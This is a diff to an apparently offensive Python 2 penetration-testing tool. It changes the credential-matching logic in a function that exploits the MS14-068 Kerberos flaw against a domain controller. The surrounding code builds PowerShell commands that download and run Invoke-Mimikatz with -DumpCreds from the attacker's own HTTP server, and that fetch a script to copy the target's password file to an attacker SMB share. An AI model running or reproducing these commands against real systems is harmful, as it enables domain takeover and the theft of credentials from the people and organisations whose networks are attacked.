@@ -2589,7 +2589,7 @@ def testMS14_068(ip,domain,username,password,passwordHash):
 
     tmpPassList=[]
     tmpHashList=[]
-    domain,domainFull=reverseLookup(ip)
+    domainShort,domainFull=reverseLookup(ip)
     n = NetBIOS(broadcast=True, listen_port=0)
     netbiosName=''
     try:
@@ -2617,14 +2617,17 @@ def testMS14_068(ip,domain,username,password,passwordHash):
     address=netbiosName
 
     tmpFoundCreds=[]
-    for x in userPassList:
-        if domainFull.lower() in str(x).lower():
-            tmpFoundCreds=x
+    if domain.lower()==domainFull.lower() or domain.lower()==domainShort.lower():
+        tmpFoundCreds.append([username,password])
+    #print domainShort
+    #for x in userPassList:
+    #    if domainFull.lower() in str(x).lower():
+    #        tmpFoundCreds=x
     if len(tmpFoundCreds)<1:
         print "[*] No domain credentials found to continue with MS14-068 test"
     if len(tmpFoundCreds)>0:
-        username=tmpFoundCreds[2]
-        password=tmpFoundCreds[3]
+        username=tmpFoundCreds[0][0]
+        password=tmpFoundCreds[0][1]
         command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
         dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
         try:
@@ -2646,8 +2649,8 @@ def testMS14_068(ip,domain,username,password,passwordHash):
             pass
     dumper=None
     if len(tmpFoundCreds)>0:
-        username=tmpFoundCreds[2]
-        password=tmpFoundCreds[3]
+        username=tmpFoundCreds[0][0]
+        password=tmpFoundCreds[0][1]
 
         command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PasswordFile.ps1\'); Get-PasswordFile '\\\\"+myIP+"\\guest'"
         dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
